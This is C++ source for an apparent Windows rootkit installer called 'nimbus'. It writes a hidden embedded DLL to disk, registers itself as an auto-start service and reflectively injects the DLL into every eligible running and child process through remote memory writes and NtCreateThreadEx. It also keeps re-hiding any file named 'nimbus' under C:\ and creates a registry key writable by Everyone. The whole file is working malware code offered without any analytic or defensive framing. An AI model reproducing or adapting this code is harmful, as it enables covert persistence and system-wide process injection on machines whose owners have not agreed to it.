#include <windows.h>
#include <aclapi.h>
#include <tlhelp32.h>
#include <string>
#include <unordered_set>
#include <vector>

namespace deploy
{
	static const wchar_t HIDDEN_MARK[] = L"nimbus";
	static const wchar_t DLL_NAME[] = L"nimbus_src.dll";

	static void SetHiddenAttribute(const wchar_t* path);

	static bool ContainsHiddenMark(const std::wstring& name)
	{
		static const std::wstring mark = HIDDEN_MARK;
		if (name.empty())
			return false;

		std::wstring lowered = name;
		for (wchar_t& c : lowered)
		{
			if (c >= L'A' && c <= L'Z')
				c = c + (L'a' - L'A');
		}
		return lowered.find(mark) != std::wstring::npos;
	}

	static std::wstring GetDllPath()
	{
		wchar_t modulePath[MAX_PATH] = {};
		if (GetModuleFileNameW(nullptr, modulePath, MAX_PATH) == 0)
			return std::wstring();

		std::wstring directory(modulePath);
		const std::wstring::size_type lastSlash = directory.find_last_of(L"\\/");
		if (lastSlash == std::wstring::npos)
			return std::wstring();

		return directory.substr(0, lastSlash + 1) + DLL_NAME;
	}

	static bool DeployEmbeddedDll()
	{
		const HRSRC resource = FindResourceW(nullptr, MAKEINTRESOURCEW(1), RT_RCDATA);
		if (resource == nullptr)
			return false;

		const HGLOBAL resourceData = LoadResource(nullptr, resource);
		if (resourceData == nullptr)
			return false;

		const LPVOID dllBytes = LockResource(resourceData);
		const DWORD dllSize = SizeofResource(nullptr, resource);
		if (dllBytes == nullptr || dllSize == 0)
			return false;

		const std::wstring dllPath = GetDllPath();
		if (dllPath.empty())
			return false;

		WIN32_FILE_ATTRIBUTE_DATA attributes = {};
		if (GetFileAttributesExW(dllPath.c_str(), GetFileExInfoStandard, &attributes) &&
			attributes.nFileSizeLow == dllSize)
		{
			SetHiddenAttribute(dllPath.c_str());
			return true;
		}

		const HANDLE file = CreateFileW(dllPath.c_str(), GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS,
			FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, nullptr);
		if (file == INVALID_HANDLE_VALUE)
			return false;

		DWORD written = 0;
		const bool ok = WriteFile(file, dllBytes, dllSize, &written, nullptr) != FALSE && written == dllSize;
		CloseHandle(file);
		return ok;
	}

	static void SetHiddenAttribute(const wchar_t* path)
	{
		const DWORD attributes = GetFileAttributesW(path);
		if (attributes == INVALID_FILE_ATTRIBUTES)
			return;
		if ((attributes & FILE_ATTRIBUTE_HIDDEN) == 0)
			SetFileAttributesW(path, attributes | FILE_ATTRIBUTE_HIDDEN);
	}
}

namespace config
{
	void EnsureConfigKey();
}

namespace injection
{
	static const wchar_t* const EXCLUDED_PROCESSES[] = {
		L"smss.exe",
		L"csrss.exe",
		L"wininit.exe",
		L"services.exe",
		L"lsass.exe",
		L"winlogon.exe",
		L"MsMpEng.exe",
		L"MSBuild.exe",
		L"dwm.exe",
		L"fontdrvhost.exe",
		L"LogonUI.exe",
		L"nimbus_installer.exe",
	};

	static BYTE* g_dllBytes = nullptr;
	static DWORD g_dllSize = 0;

	using lpNtCreateThreadEx = NTSTATUS(NTAPI*)(
		HANDLE* ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, HANDLE ProcessHandle,
		PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PVOID AttributeList);

	using lpNtQueryInformationProcess = NTSTATUS(NTAPI*)(HANDLE, ULONG, PVOID, ULONG, PULONG);

	static bool IsProcessExcludedByName(const wchar_t* processName)
	{
		for (const wchar_t* excludedName : EXCLUDED_PROCESSES)
			if (_wcsicmp(processName, excludedName) == 0)
				return true;
		return false;
	}

	static bool IsCriticalProcess(HANDLE processHandle)
	{
		static const auto ntQueryInformationProcess =
			reinterpret_cast<lpNtQueryInformationProcess>(reinterpret_cast<void*>(GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQueryInformationProcess")));

		ULONG breakOnTermination = 0;
		return ntQueryInformationProcess != nullptr &&
			ntQueryInformationProcess(processHandle, 29, &breakOnTermination, sizeof(breakOnTermination), nullptr) == 0 &&
			breakOnTermination != 0;
	}

	static bool HasMediumIntegrityOrAbove(HANDLE processHandle)
	{
		HANDLE token = nullptr;
		if (!OpenProcessToken(processHandle, TOKEN_QUERY, &token) || token == nullptr)
			return false;

		DWORD needed = 0;
		GetTokenInformation(token, TokenIntegrityLevel, nullptr, 0, &needed);
		if (needed == 0)
		{
			CloseHandle(token);
			return false;
		}

		std::vector<BYTE> buffer(needed);
		const bool ok = GetTokenInformation(token, TokenIntegrityLevel, buffer.data(), needed, &needed) &&
			((TOKEN_MANDATORY_LABEL*)buffer.data())->Label.Sid != nullptr &&
			*GetSidSubAuthority(((TOKEN_MANDATORY_LABEL*)buffer.data())->Label.Sid, 0) >= SECURITY_MANDATORY_MEDIUM_RID;

		CloseHandle(token);
		return ok;
	}

	static DWORD RvaToFileOffset(const BYTE* dllBytes, DWORD rva)
	{
		const auto dosHeader = (const IMAGE_DOS_HEADER*)dllBytes;
		const auto ntHeaders = (const IMAGE_NT_HEADERS*)(dllBytes + dosHeader->e_lfanew);
		const auto sections = (const IMAGE_SECTION_HEADER*)((LPBYTE)&ntHeaders->OptionalHeader + ntHeaders->FileHeader.SizeOfOptionalHeader);

		for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i)
		{
			const DWORD size = sections[i].Misc.VirtualSize > sections[i].SizeOfRawData ? sections[i].Misc.VirtualSize : sections[i].SizeOfRawData;
			if (rva >= sections[i].VirtualAddress && rva < sections[i].VirtualAddress + size)
				return sections[i].PointerToRawData + (rva - sections[i].VirtualAddress);
		}

		return rva;
	}

	static DWORD FindExportRva(const BYTE* dllBytes, const char* functionName)
	{
		const auto dosHeader = (const IMAGE_DOS_HEADER*)dllBytes;
		if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE)
			return 0;

		const auto ntHeaders = (const IMAGE_NT_HEADERS*)(dllBytes + dosHeader->e_lfanew);
		const DWORD exportRva = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
		if (exportRva == 0)
			return 0;

		const auto exportDirectory = (const IMAGE_EXPORT_DIRECTORY*)(dllBytes + RvaToFileOffset(dllBytes, exportRva));
		const DWORD* names = (const DWORD*)(dllBytes + RvaToFileOffset(dllBytes, exportDirectory->AddressOfNames));
		const DWORD* functions = (const DWORD*)(dllBytes + RvaToFileOffset(dllBytes, exportDirectory->AddressOfFunctions));
		const WORD* ordinals = (const WORD*)(dllBytes + RvaToFileOffset(dllBytes, exportDirectory->AddressOfNameOrdinals));

		for (DWORD i = 0; i < exportDirectory->NumberOfNames; ++i)
		{
			if (strcmp((const char*)(dllBytes + RvaToFileOffset(dllBytes, names[i])), functionName) == 0)
				return functions[ordinals[i]];
		}

		return 0;
	}

	static bool LoadDllBytesFromResource()
	{
		const HRSRC resource = FindResourceW(nullptr, MAKEINTRESOURCEW(1), RT_RCDATA);
		if (resource == nullptr)
			return false;

		const HGLOBAL resourceData = LoadResource(nullptr, resource);
		if (resourceData == nullptr)
			return false;

		const LPVOID bytes = LockResource(resourceData);
		const DWORD size = SizeofResource(nullptr, resource);
		if (bytes == nullptr || size == 0)
			return false;

		g_dllBytes = (BYTE*)bytes;
		g_dllSize = size;
		return true;
	}

	static bool InjectDllReflective(DWORD processId, const BYTE* dllBytes, DWORD dllSize)
	{
		static const DWORD REQUIRED_ACCESS =
			PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE;

		const HANDLE processHandle = OpenProcess(REQUIRED_ACCESS, FALSE, processId);
		if (processHandle == nullptr)
		{
			return false;
		}

		BOOL targetIsWow64 = FALSE;
		BOOL selfIsWow64 = FALSE;
		const bool sameBitness = IsWow64Process(processHandle, &targetIsWow64) &&
			IsWow64Process(GetCurrentProcess(), &selfIsWow64) &&
			targetIsWow64 == selfIsWow64;

		wchar_t processName[MAX_PATH] = L"";
		DWORD processNameSize = MAX_PATH;
		if (!QueryFullProcessImageNameW(processHandle, 0, processName, &processNameSize))
			processName[0] = L'\0';
		const wchar_t* basename = processName + processNameSize;
		while (basename > processName && basename[-1] != L'\\' && basename[-1] != L'/')
			--basename;

		char narrowName[MAX_PATH];
		for (DWORD i = 0; i <= processNameSize && i < MAX_PATH; ++i)
			narrowName[i] = processName[i] < 128 ? (char)processName[i] : '?';

		const bool excludedByName = IsProcessExcludedByName(basename);
		const bool critical = IsCriticalProcess(processHandle);
		const bool mediumIl = HasMediumIntegrityOrAbove(processHandle);

		const bool allowed = sameBitness && !excludedByName && !critical && mediumIl;
		if (!allowed)
		{
			CloseHandle(processHandle);
			return false;
		}

		bool result = false;
		const DWORD loaderRva = FindExportRva(dllBytes, "ReflectiveDllMain");
		if (loaderRva == 0)
		{
		}
		else
		{
			LPBYTE remoteImage = (LPBYTE)VirtualAllocEx(processHandle, nullptr, dllSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
			if (remoteImage == nullptr)
			{
			}
			else if (!WriteProcessMemory(processHandle, remoteImage, dllBytes, dllSize, nullptr))
			{
				VirtualFreeEx(processHandle, remoteImage, 0, MEM_RELEASE);
			}
			else
			{
				static const auto ntCreateThreadEx =
					reinterpret_cast<lpNtCreateThreadEx>(reinterpret_cast<void*>(GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtCreateThreadEx")));

				HANDLE thread = nullptr;
				bool started = false;
				if (ntCreateThreadEx != nullptr)
					started = ntCreateThreadEx(&thread, THREAD_ALL_ACCESS, nullptr, processHandle, remoteImage + loaderRva, remoteImage, 0, 0, 0, 0, nullptr) == 0 && thread != nullptr;
				else
				{
					thread = CreateRemoteThread(processHandle, nullptr, 0, (LPTHREAD_START_ROUTINE)(remoteImage + loaderRva), remoteImage, 0, nullptr);
					started = thread != nullptr;
				}

				if (started)
				{
					CloseHandle(thread);
					result = true;
				}
				else
				{
					VirtualFreeEx(processHandle, remoteImage, 0, MEM_RELEASE);
				}
			}
		}

		CloseHandle(processHandle);
		return result;
	}

	static DWORD WINAPI ChildPipeServer(LPVOID)
	{
		for (;;)
		{
			const HANDLE pipe = CreateNamedPipeW(
				L"\\\\.\\pipe\\nimbus_child",
				PIPE_ACCESS_DUPLEX,
				PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
				PIPE_UNLIMITED_INSTANCES,
				64, 64, 0, nullptr);

			if (pipe == INVALID_HANDLE_VALUE)
			{
				Sleep(500);
				continue;
			}

			if (ConnectNamedPipe(pipe, nullptr) || GetLastError() == ERROR_PIPE_CONNECTED)
			{
				DWORD childPid = 0;
				DWORD bytesRead = 0;
				if (ReadFile(pipe, &childPid, sizeof(childPid), &bytesRead, nullptr) && bytesRead == sizeof(childPid))
				{
					InjectDllReflective(childPid, g_dllBytes, g_dllSize);

					Sleep(150);

					const DWORD reply = 1;
					DWORD written = 0;
					WriteFile(pipe, &reply, sizeof(reply), &written, nullptr);
				}
			}

			FlushFileBuffers(pipe);
			DisconnectNamedPipe(pipe);
			CloseHandle(pipe);
		}
	}
}

namespace monitor
{
	static const wchar_t MONITORED_DIRECTORY[] = L"C:\\";
	static const DWORD POLL_INTERVAL_MS = 250;

	static HANDLE g_stopEvent = nullptr;

	static DWORD WINAPI MonitorThread(LPVOID)
	{
		const HANDLE directory = CreateFileW(
			MONITORED_DIRECTORY,
			FILE_LIST_DIRECTORY,
			FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
			nullptr,
			OPEN_EXISTING,
			FILE_FLAG_BACKUP_SEMANTICS,
			nullptr);

		if (directory == INVALID_HANDLE_VALUE)
			return 0;

		std::wstring directoryPrefix(MONITORED_DIRECTORY);
		if (!directoryPrefix.empty() && directoryPrefix.back() != L'\\')
			directoryPrefix += L'\\';

		alignas(DWORD) BYTE buffer[64 * 1024];
		for (;;)
		{
			DWORD bytesReturned = 0;
			if (!ReadDirectoryChangesW(
				directory, buffer, sizeof(buffer), TRUE,
				FILE_NOTIFY_CHANGE_FILE_NAME | FILE_NOTIFY_CHANGE_DIR_NAME,
				&bytesReturned, nullptr, nullptr))
			{
				if (GetLastError() == ERROR_NOTIFY_ENUM_DIR)
					continue;
				break;
			}

			if (bytesReturned == 0)
				continue;

			ULONG offset = 0;
			for (;;)
			{
				const auto notify = (FILE_NOTIFY_INFORMATION*)((LPBYTE)buffer + offset);
				const std::wstring fileName(notify->FileName, notify->FileNameLength / sizeof(WCHAR));
				if (deploy::ContainsHiddenMark(fileName))
					deploy::SetHiddenAttribute((directoryPrefix + fileName).c_str());

				if (notify->NextEntryOffset == 0)
					break;
				offset += notify->NextEntryOffset;
			}
		}

		CloseHandle(directory);
		return 0;
	}

	static void RunMonitor()
	{
		if (const HANDLE thread = CreateThread(nullptr, 0, MonitorThread, nullptr, 0, nullptr))
			CloseHandle(thread);

		if (const HANDLE thread = CreateThread(nullptr, 0, injection::ChildPipeServer, nullptr, 0, nullptr))
			CloseHandle(thread);

		std::unordered_set<DWORD> injectedProcesses;

		for (;;)
		{
			if (g_stopEvent != nullptr)
			{
				if (WaitForSingleObject(g_stopEvent, POLL_INTERVAL_MS) == WAIT_OBJECT_0)
					return;
			}
			else
			{
				Sleep(POLL_INTERVAL_MS);
			}

			const HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
			if (snapshot == INVALID_HANDLE_VALUE)
				continue;

			PROCESSENTRY32W processEntry {};
			processEntry.dwSize = sizeof(PROCESSENTRY32W);
			if (Process32FirstW(snapshot, &processEntry))
			{
				do
				{
					if (processEntry.th32ProcessID == GetCurrentProcessId())
						continue;

					bool excluded = false;
					for (const wchar_t* excludedName : injection::EXCLUDED_PROCESSES)
					{
						if (_wcsicmp(processEntry.szExeFile, excludedName) == 0)
						{
							excluded = true;
							break;
						}
					}
					if (excluded)
						continue;

					if (injectedProcesses.insert(processEntry.th32ProcessID).second)
						injection::InjectDllReflective(processEntry.th32ProcessID, injection::g_dllBytes, injection::g_dllSize);
				} while (Process32NextW(snapshot, &processEntry));
			}

			CloseHandle(snapshot);
		}
	}
}

namespace service
{
	static SERVICE_STATUS g_serviceStatus = {};
	static SERVICE_STATUS_HANDLE g_serviceStatusHandle = nullptr;

	static void ReportServiceStatus(DWORD currentState, DWORD controlsAccepted, DWORD waitHintMillis)
	{
		g_serviceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
		g_serviceStatus.dwCurrentState = currentState;
		g_serviceStatus.dwControlsAccepted = controlsAccepted;
		g_serviceStatus.dwWin32ExitCode = 0;
		g_serviceStatus.dwWaitHint = waitHintMillis;
		SetServiceStatus(g_serviceStatusHandle, &g_serviceStatus);
	}

	static VOID WINAPI ServiceCtrlHandler(DWORD controlCode)
	{
		if (controlCode == SERVICE_CONTROL_STOP)
		{
			ReportServiceStatus(SERVICE_STOP_PENDING, 0, monitor::POLL_INTERVAL_MS * 2);
			if (monitor::g_stopEvent != nullptr)
				SetEvent(monitor::g_stopEvent);
		}
	}

	static VOID WINAPI ServiceMain(DWORD, LPWSTR*)
	{
		g_serviceStatusHandle = RegisterServiceCtrlHandlerW(L"nimbus", ServiceCtrlHandler);
		if (g_serviceStatusHandle == nullptr)
			return;

		monitor::g_stopEvent = CreateEventW(nullptr, TRUE, FALSE, nullptr);
		ReportServiceStatus(SERVICE_RUNNING, SERVICE_ACCEPT_STOP, 0);

		deploy::DeployEmbeddedDll();
		config::EnsureConfigKey();
		if (!injection::LoadDllBytesFromResource())
			return;
		monitor::RunMonitor();

		if (monitor::g_stopEvent != nullptr)
			CloseHandle(monitor::g_stopEvent);
		ReportServiceStatus(SERVICE_STOPPED, 0, 0);
	}

	static int RunAsService()
	{
		static const SERVICE_TABLE_ENTRYW serviceTable[] = {
			{ const_cast<LPWSTR>(L"nimbus"), ServiceMain },
			{ nullptr, nullptr },
		};
		return StartServiceCtrlDispatcherW(serviceTable) != FALSE ? 0 : 1;
	}

	static bool InstallService()
	{
		wchar_t modulePath[MAX_PATH] = {};
		if (GetModuleFileNameW(nullptr, modulePath, MAX_PATH) == 0)
			return false;

		const std::wstring servicePath = std::wstring(modulePath) + L" -service";

		const SC_HANDLE serviceControlManager = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CREATE_SERVICE);
		if (serviceControlManager == nullptr)
			return false;

		const SC_HANDLE service = CreateServiceW(
			serviceControlManager,
			L"nimbus",
			L"nimbus_srvs",
			SERVICE_ALL_ACCESS,
			SERVICE_WIN32_OWN_PROCESS,
			SERVICE_AUTO_START,
			SERVICE_ERROR_NORMAL,
			servicePath.c_str(),
			nullptr, nullptr, nullptr, nullptr, nullptr);

		if (service != nullptr)
			CloseServiceHandle(service);
		CloseServiceHandle(serviceControlManager);

		return service != nullptr;
	}
}

namespace config
{
	void EnsureConfigKey()
	{
		static const wchar_t* const VALUE_NAMES[] = { L"Names", L"Paths", L"Pids", L"Ports" };

		HKEY key = nullptr;
		const LONG result = RegCreateKeyExW(
			HKEY_LOCAL_MACHINE, L"SOFTWARE\\nimbus_config", 0, nullptr, REG_OPTION_NON_VOLATILE,
			KEY_ALL_ACCESS, nullptr, &key, nullptr);
		if (result != ERROR_SUCCESS)
			return;

		for (const wchar_t* valueName : VALUE_NAMES)
		{
			const wchar_t empty[2] = {};
			RegSetValueExW(key, valueName, 0, REG_MULTI_SZ, (const BYTE*)empty, sizeof(empty));
		}
		RegCloseKey(key);

		EXPLICIT_ACCESSW explicitAccess = {};
		explicitAccess.grfAccessPermissions = GENERIC_ALL;
		explicitAccess.grfAccessMode = GRANT_ACCESS;
		explicitAccess.grfInheritance = SUB_CONTAINERS_AND_OBJECTS_INHERIT;
		explicitAccess.Trustee.TrusteeForm = TRUSTEE_IS_SID;
		explicitAccess.Trustee.ptstrName = (LPWSTR)L"S-1-1-0";

		PACL dacl = nullptr;
		if (SetEntriesInAclW(1, &explicitAccess, nullptr, &dacl) == ERROR_SUCCESS)
		{
			SetNamedSecurityInfoW((LPWSTR)L"MACHINE\\SOFTWARE\\nimbus_config", SE_REGISTRY_KEY,
				DACL_SECURITY_INFORMATION, nullptr, nullptr, dacl, nullptr);
			LocalFree(dacl);
		}
	}
}

int wmain(int argc, wchar_t* argv[])
{
	if (argc > 1 && _wcsicmp(argv[1], L"-service") == 0)
		return service::RunAsService();

	FreeConsole();
	deploy::DeployEmbeddedDll();
	config::EnsureConfigKey();
	service::InstallService();

	if (!injection::LoadDllBytesFromResource())
		return 1;

	monitor::RunMonitor();
	return 0;
}
